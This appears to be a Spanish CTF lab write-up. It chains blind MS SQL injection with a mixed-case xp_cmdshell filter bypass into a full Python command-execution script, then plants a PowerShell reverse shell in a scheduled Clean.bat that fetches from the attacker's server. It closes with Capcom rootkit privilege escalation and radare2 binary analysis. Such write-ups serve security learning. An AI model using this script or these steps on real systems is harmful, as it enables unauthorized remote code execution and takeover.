## Tecnicas utilizadas
-   Advanced SQL Injection [SQLI] - MS SQL Server 2014 [Bypass Protection] [Python Scripting] [RCE]
-   Abusing Cron Jobs
-   Capcom Rootkit Privilege Escalation
-   Binary and DLL Analysis in order to get root.txt [Radare2]
## Procedimiento
- Fuzzing web
- Vhost Fuzzing
- Intentar activar el xp_cmdshell(Todo esto a ciegas, ya que no hay ningun tipo de output que nos confirme nada)
- Crear una tabla para operar con los comandos: `;create table rce(output varchar(1024));`. Para confirmar que ha funcionado: `;insert into rce(output) exec xp_cmdshell "whoami";` y verificamos el output de la tabla que hemos creado(intentamos bypassear la medida de seguiridad implementada que no nos permite colocar "xp_cmdshell"): `union select <sequency> (select top 1 output from rce)`
- Para optimizar mejor la busqueda del output, crearemos mejor una tabla que contenga una primary key incremental: `;create table rce(id int identity(1,1) primary key, output varchar(1024));`. Tambien podemos vaciar la tabla para organizarnos mejor: `;truncate table rce;`.
- Una vez teniendo la tabla que autoincremenda con cada insert, podemos filtrar con un where y colocando el identificador: `;union select <sequency>,(select top 1 output from rce where id=$num),6-- -;`
python scripting ↓
```python 

#!/usr/bin/python3

from pwn import *
import requests, signal, pdb, time
from base64 import b64decode  

def def_handler(sig,frame):

	print("\n\n[!] Saliendo...\n")
	dropTable()
	sys.exit(1)
	
#ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Variables globales 
main_url = "<url>"

def createTable():
	
	post_data = {
		"username" : "admin",
		"password" : "admin",
		"logintype" : "2;create table rce(id int identity(1,1) primary key, output varchar(1024));-- -",
		"rememberme" : "ON",
		"B1" : "LogIn"
	}
	# Creating rce table 
	r = requests.post(main_url, data=post_data)

	

def executeCommand(command):
	
	post_data = {
		"username" : "admin",
		"password" : "admin",
		'logintype' : '2;insert into rce(output) exec Xp_cMdShEll "%s";-- -' % command,
		"rememberme" : "ON",
		"B1" : "LogIn"
	}
	# Execution command 
	r = requests.post(main_url, data=post_data)

	post_data = {
		"username" : "admin",
		"password" : "admin",
		'logintype' : '2 union select 1,2,3,4,(select top 1 id from rce order by id desc),6 -- -',
		"rememberme" : "ON",
		"B1" : "LogIn"
	}
	# Get ID top counter
	r = requests.post(main_url, data=post_data, allow_redirects=False)

	topIdCounter = b64decode(r.headers['Set-Cookie'].split(";")[0].replace("Email=", "").replace("%3D", "=")).decode()

	for i in range(1, int(topIdCounter)):

		post_data = {
			"username" : "admin",
			"password" : "admin",
			'logintype' : '2 union select 1,2,3,4,(select output from rce where id=%d),6 -- -' % i,
			"rememberme" : "ON",
			"B1" : "LogIn"
		}

		r = requests.post(main_url, data=post_data, allow_redirects=False)
		
		output = b64decode(r.headers['Set-Cookie'].split(";")[0].replace("Email=", "").replace("%3D", "="))

		if b"\xeb\xde\x94\xd8" not in output:
			print(output.decode())
			
	truncateTable()

def dropTable():
	
	post_data = {
		"username" : "admin",
		"password" : "admin",
		'logintype' : '2;drop table rce;-- -',
		"rememberme" : "ON",
		"B1" : "LogIn"
	}
	# Droping rce table
	r = requests.post(main_url, data=post_data)

def truncateTable():
	
	post_data = {
		"username" : "admin",
		"password" : "admin",
		'logintype' : '2;truncate table rce;-- -',
		"rememberme" : "ON",
		"B1" : "LogIn"
	}
	# truncating rce table
	r = requests.post(main_url, data=post_data)
	
if __name__ == "__main__":

	#createTable()

	while True:
		command = input("> ")
		command = command.strip("\n")

		executeCommand(command)

		print("\n")
	


```

- Entablar una reverse shell con el repositorio de nishan(con powershell)
- Vaciar el contenido del archivo encontrado *Clean.bat* e incrustar el codigo que utilizamos para entablarnos la revershell con el *sqli*
- Meter en el script el comando que descargamos desde nuestra maquina previamente, con `cmd /c "type C:\Users\sqlserv\command >> clean.bat"`
- Abrir un servidor en python3 para que el script que se ejecuta en intervalos definidos de tiempo, descargue el archivo y ejecute el script en PS. Paralelamente estar en escucha con NetCat.
- Explotar el **Capcom rootkit** con el exploit de github de *FuzzySecurity*
	1. Filtrar por todos los archivos que terminen por ".ps1" `find . -name \*.ps1`
	3. `for file in $(find . -name \*.ps1); do cat $file; echo; done > ../capcom.ps1`
	4. Podemos ver las funciones que el script que compactamos nos ofrece `cat capcom.ps1 | grep -i function`
	5. Interpretamos con PS el script(lo podemos descargar e interpretar o interpretarlo de una con PS)
- Descargamos el archivo a nuestra maquina atacante para analizarlo
- Tratamos el archivo en b64 para paarlo al formato original `cat data | tr -d "\n" | base64 -d | sponge <samefile>`
- Pasamos el archivo por **radare2**. Una vez en radare2 con el archivo, colocamos *aaa* para analizar todas las funciones y con *afl* listamos todas las funciones. Usamos *s main* para sincronizarnos con la funciones main. Y con *pdf* podemos ver a bajo nivel lo que esta sucediento
- Tambien nos traemos el archivo .dll a nuestra maquina para analizarlo. Hacemos el mismo procedimiento con radare2 para inspeccionar todas las funciones y mirar sys.check.dll_check
- Pasamos la cadena encontrada por cyberchef con el decode de *xor bruteforce*